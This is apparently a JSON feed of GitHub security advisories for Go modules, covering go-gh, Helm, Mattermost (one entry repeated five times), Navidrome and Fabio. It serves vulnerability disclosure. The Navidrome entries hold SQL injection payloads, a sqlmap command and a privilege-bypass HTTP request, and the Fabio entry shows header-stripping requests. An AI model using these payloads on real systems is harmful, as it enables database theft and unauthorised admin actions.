{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://xlordz.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A security vulnerability has been identified in <code>go-gh</code> where an attacker-controlled GitHub Enterprise Server could result in executing arbitrary commands on a user's machine by replacing HTTP URLs provided by GitHub with local file paths for browsing. </p>\n<h3 id=\"details\">Details</h3>\n<p>The GitHub CLI and CLI extensions allow users to transition from their terminal for a variety of use cases through the <a href=\"https://github.com/cli/go-gh/blob/61bf393cf4aeea6d00a6251390f5f67f5b67e727/pkg/browser/browser.go\"><code>Browser</code> capability in <code>github.com/cli/go-gh/v2/pkg/browser</code></a>:</p>\n<ul>\n<li>Using the <code>-w, --web</code> flag, GitHub CLI users can view GitHub repositories, issues, pull requests, and more using their web browser</li>\n<li>Using the <code>gh codespace</code> command set, GitHub CLI users can transition to Visual Studio Code to work with GitHub Codespaces</li>\n</ul>\n<p>This is done by using URLs provided through API responses from authenticated GitHub hosts when users execute <code>gh</code> commands.</p>\n<p>Prior to <code>2.12.1</code>, <code>Browser.Browse()</code> would attempt to open the provided URL using a variety of OS-specific approaches regardless of the scheme.  An attacker-controlled GitHub Enterprise Server could modify API responses to use a specially tailored local executable path instead of HTTP URLs to resources.  This could allow the attacker to execute arbitrary executables on the user's machine. </p>\n<p>In <code>2.12.1</code>, <code>Browser.Browse()</code> has been enhanced to allow and disallow a variety of scenarios to avoid opening or executing files on the filesystem without unduly impacting HTTP URLs:</p>\n<ol>\n<li>URLs with <code>http://</code>, <code>https://</code>, <code>vscode://</code>, <code>vscode-insiders://</code> protocols are supported</li>\n<li>URLs with <code>file://</code> protocol are unsupported</li>\n<li>URLs matching files or directories on the filesystem are unsupported</li>\n<li>URLs matching executables in the user's path are unsupported</li>\n</ol>\n<p>URLs without protocols will be browsable if none of these other conditions apply.</p>\n<p>As we have more information about use cases, maintainers can expand these capabilities for an improved user experience that allows configuring allowed URL schemes and/or prompt the user for an unexpected user case and confirming whether to continue.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Successful exploitation could cause users of the attacker-controlled GitHub Enterprise Server to execute arbitrary commands.</p>\n<h3 id=\"remediation-and-mitigation\">Remediation and Mitigation</h3>\n<ol>\n<li>Upgrade <code>go-gh</code> to <code>2.12.1</code></li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cli/go-gh/security/advisories/GHSA-g9f5-x53j-h563\">https://github.com/cli/go-gh/security/advisories/GHSA-g9f5-x53j-h563</a></li>\n<li><a href=\"https://github.com/cli/go-gh/commit/a08820a13f257d6c5b4cb86d37db559ec6d14577\">https://github.com/cli/go-gh/commit/a08820a13f257d6c5b4cb86d37db559ec6d14577</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g9f5-x53j-h563\">https://github.com/advisories/GHSA-g9f5-x53j-h563</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g9f5-x53j-h563",
            "title": "[github.com/cli/go-gh/v2] Prevent GitHub CLI and extensions from executing arbitrary commands from compromised GitHub Enterprise Server",
            "date_modified": "2025-05-30T15:30:43.000Z",
            "date_published": "2025-05-30T15:30:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g9f5-x53j-h563"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>During a security audit of Helm's code base, Helm maintainers identified a bug in which a Helm plugin can contain duplicates of the same entry, with the last one always used. If a plugin is compromised, this lowers the level of access that an attacker needs to modify a plugin's install hooks, causing a local execution attack.</p>\n<p>To perform this attack, an attacker must have write access to the git repository or plugin archive (.tgz) while being downloaded (which can occur during a MITM attack on a non-SSL connection).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This issue has been patched in Helm 2.16.11 and Helm 3.3.2.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Make sure to install plugins using a secure connection protocol like SSL.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/helm/helm/security/advisories/GHSA-c52f-pq47-2r9j\">https://github.com/helm/helm/security/advisories/GHSA-c52f-pq47-2r9j</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-15187\">https://nvd.nist.gov/vuln/detail/CVE-2020-15187</a></li>\n<li><a href=\"https://github.com/helm/helm/commit/6aab63765f99050b115f0aec3d6350c85e8da946\">https://github.com/helm/helm/commit/6aab63765f99050b115f0aec3d6350c85e8da946</a></li>\n<li><a href=\"https://github.com/helm/helm/commit/d9ef5ce8bad512e325390c0011be1244b8380e4b\">https://github.com/helm/helm/commit/d9ef5ce8bad512e325390c0011be1244b8380e4b</a></li>\n<li><a href=\"https://github.com/helm/helm/commit/ac7c07c37d87e09797f714fb57aa5e9cb99d9450\">https://github.com/helm/helm/commit/ac7c07c37d87e09797f714fb57aa5e9cb99d9450</a></li>\n<li><a href=\"https://github.com/helm/helm/commit/b0296c0522e837d65f944beefa3fb64fd08ac304\">https://github.com/helm/helm/commit/b0296c0522e837d65f944beefa3fb64fd08ac304</a></li>\n<li><a href=\"https://github.com/helm/helm/commit/c8d6b01d72c9604e43ee70d0d78fadd54c2d8499\">https://github.com/helm/helm/commit/c8d6b01d72c9604e43ee70d0d78fadd54c2d8499</a></li>\n<li><a href=\"https://github.com/helm/helm/commit/f2ede29480b507b7d8bb152dd8b6b86248b00658\">https://github.com/helm/helm/commit/f2ede29480b507b7d8bb152dd8b6b86248b00658</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c52f-pq47-2r9j\">https://github.com/advisories/GHSA-c52f-pq47-2r9j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c52f-pq47-2r9j",
            "title": "[helm.sh/helm] plugin.yaml file allows for duplicate entries in helm",
            "date_modified": "2025-05-29T22:59:19.000Z",
            "date_published": "2021-05-24T16:57:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c52f-pq47-2r9j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost versions 10.7.x &lt;= 10.7.0, 10.6.x &lt;= 10.6.2, 10.5.x &lt;= 10.5.3, 9.11.x &lt;= 9.11.12 fail to properly validate permissions when changing team privacy settings, allowing team administrators without the 'invite user' permission to access and modify team invite IDs via the /api/v4/teams/:teamId/privacy endpoint.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-3913\">https://nvd.nist.gov/vuln/detail/CVE-2025-3913</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/mattermost/mattermost/commit/02c76784380acb6802601bd24c205553b9a5a1be\">https://github.com/mattermost/mattermost/commit/02c76784380acb6802601bd24c205553b9a5a1be</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4mmr-2w8p-whcr\">https://github.com/advisories/GHSA-4mmr-2w8p-whcr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4mmr-2w8p-whcr",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost improperly allows team administrators to modify team invites",
            "date_modified": "2025-05-29T22:37:08.000Z",
            "date_published": "2025-05-29T18:31:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4mmr-2w8p-whcr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost versions 10.7.x &lt;= 10.7.0, 10.6.x &lt;= 10.6.2, 10.5.x &lt;= 10.5.3, 9.11.x &lt;= 9.11.12 fail to properly validate permissions when changing team privacy settings, allowing team administrators without the 'invite user' permission to access and modify team invite IDs via the /api/v4/teams/:teamId/privacy endpoint.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-3913\">https://nvd.nist.gov/vuln/detail/CVE-2025-3913</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/mattermost/mattermost/commit/02c76784380acb6802601bd24c205553b9a5a1be\">https://github.com/mattermost/mattermost/commit/02c76784380acb6802601bd24c205553b9a5a1be</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4mmr-2w8p-whcr\">https://github.com/advisories/GHSA-4mmr-2w8p-whcr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4mmr-2w8p-whcr",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost improperly allows team administrators to modify team invites",
            "date_modified": "2025-05-29T22:37:08.000Z",
            "date_published": "2025-05-29T18:31:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4mmr-2w8p-whcr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost versions 10.7.x &lt;= 10.7.0, 10.6.x &lt;= 10.6.2, 10.5.x &lt;= 10.5.3, 9.11.x &lt;= 9.11.12 fail to properly validate permissions when changing team privacy settings, allowing team administrators without the 'invite user' permission to access and modify team invite IDs via the /api/v4/teams/:teamId/privacy endpoint.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-3913\">https://nvd.nist.gov/vuln/detail/CVE-2025-3913</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/mattermost/mattermost/commit/02c76784380acb6802601bd24c205553b9a5a1be\">https://github.com/mattermost/mattermost/commit/02c76784380acb6802601bd24c205553b9a5a1be</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4mmr-2w8p-whcr\">https://github.com/advisories/GHSA-4mmr-2w8p-whcr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4mmr-2w8p-whcr",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost improperly allows team administrators to modify team invites",
            "date_modified": "2025-05-29T22:37:08.000Z",
            "date_published": "2025-05-29T18:31:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4mmr-2w8p-whcr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost versions 10.7.x &lt;= 10.7.0, 10.6.x &lt;= 10.6.2, 10.5.x &lt;= 10.5.3, 9.11.x &lt;= 9.11.12 fail to properly validate permissions when changing team privacy settings, allowing team administrators without the 'invite user' permission to access and modify team invite IDs via the /api/v4/teams/:teamId/privacy endpoint.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-3913\">https://nvd.nist.gov/vuln/detail/CVE-2025-3913</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/mattermost/mattermost/commit/02c76784380acb6802601bd24c205553b9a5a1be\">https://github.com/mattermost/mattermost/commit/02c76784380acb6802601bd24c205553b9a5a1be</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4mmr-2w8p-whcr\">https://github.com/advisories/GHSA-4mmr-2w8p-whcr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4mmr-2w8p-whcr",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost improperly allows team administrators to modify team invites",
            "date_modified": "2025-05-29T22:37:08.000Z",
            "date_published": "2025-05-29T18:31:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4mmr-2w8p-whcr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost versions 10.7.x &lt;= 10.7.0, 10.6.x &lt;= 10.6.2, 10.5.x &lt;= 10.5.3, 9.11.x &lt;= 9.11.12 fail to properly validate permissions when changing team privacy settings, allowing team administrators without the 'invite user' permission to access and modify team invite IDs via the /api/v4/teams/:teamId/privacy endpoint.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-3913\">https://nvd.nist.gov/vuln/detail/CVE-2025-3913</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/mattermost/mattermost/commit/02c76784380acb6802601bd24c205553b9a5a1be\">https://github.com/mattermost/mattermost/commit/02c76784380acb6802601bd24c205553b9a5a1be</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4mmr-2w8p-whcr\">https://github.com/advisories/GHSA-4mmr-2w8p-whcr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4mmr-2w8p-whcr",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost improperly allows team administrators to modify team invites",
            "date_modified": "2025-05-29T22:37:08.000Z",
            "date_published": "2025-05-29T18:31:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4mmr-2w8p-whcr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A permission verification flaw in Navidrome allows any authenticated regular user to bypass authorization checks and perform administrator-only transcoding configuration operations, including creating, modifying, and deleting transcoding settings.</p>\n<h3 id=\"details\">Details</h3>\n<p>Navidrome supports transcoding functionality which, although disabled by default, should restrict configuration operations to administrators only. However, the application fails to properly validate whether a user has administrative privileges when handling transcoding configuration requests.</p>\n<p>The vulnerability exists in the API endpoints that manage transcoding settings. When a regular user sends requests to these endpoints, the application processes them without verifying if the user has administrative privileges, despite the JWT token clearly indicating the user is not an administrator (<code>\"adm\":false</code>).</p>\n<p>The affected endpoints include:</p>\n<ul>\n<li><code>POST /api/transcoding</code> (Create transcoding configuration)</li>\n<li><code>PUT /api/transcoding/:id</code> (Update transcoding configuration)</li>\n<li><code>DELETE /api/transcoding/:id</code> (Delete transcoding configuration)</li>\n<li><code>GET /api/transcoding</code> (List transcoding configurations)</li>\n</ul>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Set up Navidrome with transcoding enabled</li>\n<li>Log in as a regular user (non-administrator)</li>\n<li>Send the following HTTP request:</li>\n</ol>\n<pre><code>POST /api/transcoding HTTP/1.1\nHost: 192.168.199.134:4533\nContent-Length: 81\nx-nd-client-unique-id: e559d130-4295-401e-b65f-be7fdd564e\naccept: application/json\nx-nd-authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG0iOmZhbHNlLCJleHAiOjE3NDY2MzIyNDEsImlhdCI6MTc0NjQ1ODk5NiwiaXNzIjoiTkQiLCJzdWIiOiJ1c2VyMSIsInVpZCI6InV3THJGcWxXNHhnNEt4QjNxMk85eTYifQ.jqv2eESY8QTAHY-oLbBmO0v8IyDXrofvXqQgXSrJ6SM\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36\ncontent-type: application/json\nOrigin: http://192.168.199.134:4533\nReferer: http://192.168.199.134:4533/app/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\n\n{\"defaultBitRate\":192,\"name\":\"trans6\",\"command\":\"tran6\",\"targetFormat\":\"tran6\"}\n</code></pre>\n<ol start=\"4\">\n<li>The request will succeed despite the JWT token clearly indicating the user is not an administrator (<code>\"adm\":false</code>)</li>\n<li>The same operation can be performed with administrator credentials, confirming that no authorization check is being performed</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability allows regular users to modify critical system configurations that should be restricted to administrators only. While Navidrome does not recommend enabling transcoding in production environments, when it is enabled, proper authorization checks should still be enforced.</p>\n<p>The security impact includes:</p>\n<ol>\n<li><strong>Privilege Escalation</strong>: Regular users can perform administrator-only actions</li>\n<li><strong>System Configuration Tampering</strong>: Unauthorized users can modify transcoding settings, potentially affecting system performance or functionality</li>\n<li><strong>Potential Command Injection</strong>: Since transcoding settings include command parameters, this could potentially lead to command injection if not properly sanitized</li>\n</ol>\n<p>In the threat model where administrators are trusted but regular users are not, this vulnerability represents a significant security risk when transcoding is enabled.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/navidrome/navidrome/security/advisories/GHSA-f238-rggp-82m3\">https://github.com/navidrome/navidrome/security/advisories/GHSA-f238-rggp-82m3</a></li>\n<li><a href=\"https://github.com/navidrome/navidrome/pull/4096\">https://github.com/navidrome/navidrome/pull/4096</a></li>\n<li><a href=\"https://github.com/navidrome/navidrome/commit/e5438552c63fecb6284e1b179dddae91ede869c8\">https://github.com/navidrome/navidrome/commit/e5438552c63fecb6284e1b179dddae91ede869c8</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f238-rggp-82m3\">https://github.com/advisories/GHSA-f238-rggp-82m3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f238-rggp-82m3",
            "title": "[github.com/navidrome/navidrome] Navidrome Transcoding Permission Bypass Vulnerability Report",
            "date_modified": "2025-05-29T22:36:53.000Z",
            "date_published": "2025-05-29T22:36:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f238-rggp-82m3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"🛡-security-advisory-sql-injection-vulnerability-in-navidrome-v0552\">🛡 <strong>Security Advisory: SQL Injection Vulnerability in Navidrome v0.55.2</strong></h2>\n<h3 id=\"overview\"><strong>Overview</strong></h3>\n<p>This vulnerability arises due to improper input validation on the <strong><code>role</code></strong> parameter within the API endpoint <strong><code>/api/artist</code></strong>. Attackers can exploit this flaw to inject arbitrary SQL queries, potentially gaining unauthorized access to the backend database and compromising sensitive user information.</p>\n<hr>\n<h3 id=\"details\"><strong>Details</strong></h3>\n<ul>\n<li><p><strong>Vulnerable Component</strong>:\nAPI endpoint → <code>/api/artist</code>\nParameter → <code>role</code></p>\n</li>\n<li><p><strong>Vulnerability Type</strong>:\nSQL Injection (stacked queries, UNION queries)</p>\n</li>\n<li><p><strong>Database Affected</strong>:\nSQLite (confirmed exploitation via SQLite-specific payloads)</p>\n</li>\n<li><p><strong>Impact</strong>:\nSuccessful exploitation allows an unauthenticated attacker to:</p>\n<ul>\n<li>Execute arbitrary SQL commands</li>\n<li>Extract or manipulate sensitive data (e.g., user records, playlists)</li>\n<li>Potentially escalate privileges or disrupt service availability</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h3 id=\"proof-of-concept-poc\"><strong>Proof of Concept (PoC)</strong></h3>\n<p><strong>Example Exploit Command</strong>:</p>\n<pre><code class=\"language-bash\">sqlmap.py -r navi --level 5 --risk 3 -a --banner --batch --tamper charencode --dbms sqlite\n</code></pre>\n<p><strong>Sample Payloads</strong>:</p>\n<ul>\n<li><p><strong>Stacked Queries</strong>:</p>\n<pre><code>http://navidrome/api/artist?_end=15&amp;_order=ASC&amp;_sort=name&amp;_start=0&amp;role=albumartist');SELECT LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))--\n</code></pre>\n</li>\n<li><p><strong>UNION-Based Query</strong>:</p>\n<pre><code>http://navidrome.local/api/artist?_end=15&amp;_order=ASC&amp;_sort=name&amp;_start=0&amp;role=albumartist') UNION ALL SELECT 92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,CHAR(113,98,118,98,113)||CHAR(113,84,86,119,114,71,106,104,90,118,120,104,79,66,104,108,121,106,70,68,90,113,104,117,67,98,113,67,103,84,71,120,119,119,117,121,81,76,100,71)||CHAR(113,120,112,106,113),92,92,92,92-- Mtny\n</code></pre>\n</li>\n</ul>\n<p><strong>Example HTTP Request</strong>:</p>\n<pre><code class=\"language-http\">GET /api/artist?_end=15&amp;_order=ASC&amp;_sort=name&amp;_start=0&amp;role=albumartist* HTTP/2\nHost: &lt;TARGET HOST&gt;\nCookie: &lt;REPLACE WITH VALID COOKIE&gt;\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0\nAccept: application/json\nX-Nd-Authorization: &lt;REPLACE WITH AUTH TOKEN&gt;\nX-Nd-Client-Unique-Id: &lt;REPLACE WITH CLIENT ID&gt;\n</code></pre>\n<hr>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/navidrome/navidrome/security/advisories/GHSA-5wgp-vjxm-3x2r\">https://github.com/navidrome/navidrome/security/advisories/GHSA-5wgp-vjxm-3x2r</a></li>\n<li><a href=\"https://github.com/navidrome/navidrome/commit/b19d5f0d3e079639904cac95735228f445c798b6\">https://github.com/navidrome/navidrome/commit/b19d5f0d3e079639904cac95735228f445c798b6</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5wgp-vjxm-3x2r\">https://github.com/advisories/GHSA-5wgp-vjxm-3x2r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5wgp-vjxm-3x2r",
            "title": "[github.com/navidrome/navidrome] Navidrome allows SQL Injection via role parameter",
            "date_modified": "2025-05-29T21:21:05.000Z",
            "date_published": "2025-05-29T17:27:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5wgp-vjxm-3x2r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Fabio allows clients to remove X-Forwarded headers (except X-Forwarded-For) due to a vulnerability in how it processes hop-by-hop headers.</p>\n<p>Fabio adds HTTP headers like X-Forwarded-Host and X-Forwarded-Port when routing requests to backend applications. Since the receiving application should trust these headers, allowing HTTP clients to remove or modify them creates potential security vulnerabilities.</p>\n<p>However, it was found that some of these custom headers can indeed be removed and, in certain cases, manipulated. The attack relies on the behavior that headers can be defined as hop-by-hop via the HTTP Connection header. By setting the following connection header, the X-Forwarded-Host header can, for example, be removed:</p>\n<pre><code>Connection: close, X-Forwarded-Host\n</code></pre>\n<p>Similar critical vulnerabilities have been identified in other web servers and proxies, including <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-31813\">CVE-2022-31813</a> in Apache HTTP Server and <a href=\"https://github.com/advisories/GHSA-62c8-mh53-4cqv\">CVE-2024-45410</a> in Traefik.</p>\n<h3 id=\"details\">Details</h3>\n<p>It was found that the following headers can be removed in this way (i.e. by specifying them within a connection header):</p>\n<ul>\n<li>X-Forwarded-Host</li>\n<li>X-Forwarded-Port</li>\n<li>X-Forwarded-Proto</li>\n<li>X-Real-Ip</li>\n<li>Forwarded</li>\n</ul>\n<h3 id=\"poc\">PoC</h3>\n<p>The following docker-compose file was used for testing:</p>\n<pre><code class=\"language-yml\">version: '3'\nservices:\n  fabio:\n    image: fabiolb/fabio\n    ports:\n      - \"3000:9999\"\n      - \"9998:9998\"\n    volumes:\n      - ./fabio.properties:/etc/fabio/fabio.properties\n\n  backend:\n    build: .\n    ports:\n      - \"8080:8080\"\n    environment:\n      - PYTHONUNBUFFERED=1\n</code></pre>\n<p>The fabio.properties configuration:</p>\n<pre><code>proxy.addr = :9999\nui.addr = :9998\nregistry.backend = static\nregistry.static.routes = route add service / http://backend:8080/\n</code></pre>\n<p>A Python container runs a simple HTTP server that logs received headers.\nThe Dockerfile:</p>\n<pre><code class=\"language-dockerfile\">FROM python:3.11-slim\n\nWORKDIR /app\n\nCOPY app.py .\n\nRUN pip install flask\n\nEXPOSE 8080\n\nCMD [\"python\", \"app.py\"]\n</code></pre>\n<p>Python Flask Server</p>\n<pre><code class=\"language-python\">from flask import Flask, request\nimport sys\nimport os\n\nsys.stdout.flush()\nsys.stderr.flush()\nos.environ['PYTHONUNBUFFERED'] = '1'\n\napp = Flask(__name__)\n\n@app.before_request\ndef log_request_info():\n    print(\"HEADERS:\")\n    for header_name, header_value in request.headers:\n        print(f\"   {header_name}: {header_value}\")\n\n@app.route(\"/\", methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])\ndef hello():\n    return f\"Hello, World! Method: {request.method}\"\n\n@app.route(\"/&lt;path:path&gt;\", methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])\ndef catch_all(path):\n    return f\"Caught path: {path}, Method: {request.method}\"\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", port=8080, debug=True)\n</code></pre>\n<p>A normal HTTP request/response pair looks like this:</p>\n<h4 id=\"request\">Request</h4>\n<pre><code class=\"language-http\">GET / HTTP/1.1\nHost: 127.0.0.1:3000\nUser-Agent: curl/8.7.1\nAccept: */*\nConnection: keep-alive\n</code></pre>\n<p>curl command</p>\n<pre><code class=\"language-bash\">curl --path-as-is -i -s -k -X $'GET' \\\n    -H $'Host: 127.0.0.1:3000' -H $'User-Agent: curl/8.7.1' -H $'Accept: */*' -H $'Connection: keep-alive' \\\n    $'http://127.0.0.1:3000/'\n</code></pre>\n<h4 id=\"response\">Response</h4>\n<pre><code class=\"language-http\">HTTP/1.1 200 OK\nServer: Werkzeug/3.1.3 Python/3.11.12\nDate: Thu, 22 May 2025 23:09:12 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 25\nConnection: close\n\nHello, World! Method: GET\n</code></pre>\n<p>Server Log</p>\n<pre><code>backend-1  | HEADERS:\nbackend-1  |    Host: 127.0.0.1:3000\nbackend-1  |    User-Agent: curl/8.7.1\nbackend-1  |    Accept: */*\nbackend-1  |    Forwarded: for=192.168.65.1; proto=http; by=172.24.0.3; httpproto=http/1.1\nbackend-1  |    X-Forwarded-For: 192.168.65.1\nbackend-1  |    X-Forwarded-Host: 127.0.0.1:3000\nbackend-1  |    X-Forwarded-Port: 3000\nbackend-1  |    X-Forwarded-Proto: http\nbackend-1  |    X-Real-Ip: 192.168.65.1\n</code></pre>\n<p>Next, a request, where the Forwarded header is defined as a hop-by-hop header via the Connection header is sent:</p>\n<h4 id=\"request-1\">Request</h4>\n<pre><code class=\"language-http\">GET / HTTP/1.1\nHost: 127.0.0.1:3000\nUser-Agent: curl/8.7.1\nAccept: */*\nyeet: 123\nConnection: keep-alive, Forwarded\n</code></pre>\n<p>curl command</p>\n<pre><code class=\"language-bash\">curl --path-as-is -i -s -k -X $'GET' \\\n    -H $'Host: 127.0.0.1:3000' -H $'User-Agent: curl/8.7.1' -H $'Accept: */*' -H $'Connection: keep-alive, Forwarded' \\\n    $'http://127.0.0.1:3000/'\n</code></pre>\n<h4 id=\"response-1\">Response</h4>\n<pre><code class=\"language-http\">HTTP/1.1 200 OK\nContent-Length: 25\nContent-Type: text/html; charset=utf-8\nDate: Thu, 22 May 2025 23:42:45 GMT\nServer: Werkzeug/3.1.3 Python/3.11.12\n\nHello, World! Method: GET\n</code></pre>\n<p>Server Logs</p>\n<pre><code>backend-1  | HEADERS:\nbackend-1  |    Host: 127.0.0.1:3000\nbackend-1  |    User-Agent: curl/8.7.1\nbackend-1  |    Accept: */*\nbackend-1  |    X-Forwarded-For: 192.168.65.1\nbackend-1  |    X-Forwarded-Host: 127.0.0.1:3000\nbackend-1  |    X-Forwarded-Port: 3000\nbackend-1  |    X-Forwarded-Proto: http\nbackend-1  |    X-Real-Ip: 192.168.65.1\n</code></pre>\n<p>The response shows that Fabio's <code>Forwarded</code> header was removed from the request</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If the backend application trusts these custom headers for security-sensitive operations, their removal or modification may lead to vulnerabilities such as access control bypass.</p>\n<p>This vulnerability has a critical severity rating similar to  <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-31813\">CVE-2022-31813</a> (Apache HTTP Server, 9.8) and <a href=\"https://github.com/advisories/GHSA-62c8-mh53-4cqv\">CVE-2024-45410</a> (Traefik, 9.3)</p>\n<p>Stripping headers like <code>X-Real-IP</code> can confuse the upstream server about whether the request is coming from an external client through the reverse proxy or from an internal source. This type of vulnerability can be exploited as demonstrated in: <a href=\"https://projectdiscovery.io/blog/versa-concerto-authentication-bypass-rce\">Versa Concerto RCE</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/advisories/GHSA-62c8-mh53-4cqv\">CVE-2024-45410</a> </li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-31813\">CVE-2022-31813</a></li>\n<li><a href=\"https://projectdiscovery.io/blog/versa-concerto-authentication-bypass-rce\">Versa Concerto RCE</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/fabiolb/fabio/security/advisories/GHSA-q7p4-7xjv-j3wf\">https://github.com/fabiolb/fabio/security/advisories/GHSA-q7p4-7xjv-j3wf</a></li>\n<li><a href=\"https://github.com/fabiolb/fabio/commit/fdaf1e966162e9dd3b347ffdd0647b39dc71a1a3\">https://github.com/fabiolb/fabio/commit/fdaf1e966162e9dd3b347ffdd0647b39dc71a1a3</a></li>\n<li><a href=\"https://github.com/fabiolb/fabio/releases/tag/v1.6.6\">https://github.com/fabiolb/fabio/releases/tag/v1.6.6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-48865\">https://nvd.nist.gov/vuln/detail/CVE-2025-48865</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q7p4-7xjv-j3wf\">https://github.com/advisories/GHSA-q7p4-7xjv-j3wf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q7p4-7xjv-j3wf",
            "title": "[github.com/fabiolb/fabio] Fabio allows HTTP clients to manipulate custom headers it adds",
            "date_modified": "2025-05-30T15:25:57.000Z",
            "date_published": "2025-05-29T16:50:58.000Z",
            "author": {
                "name": "GitHub",
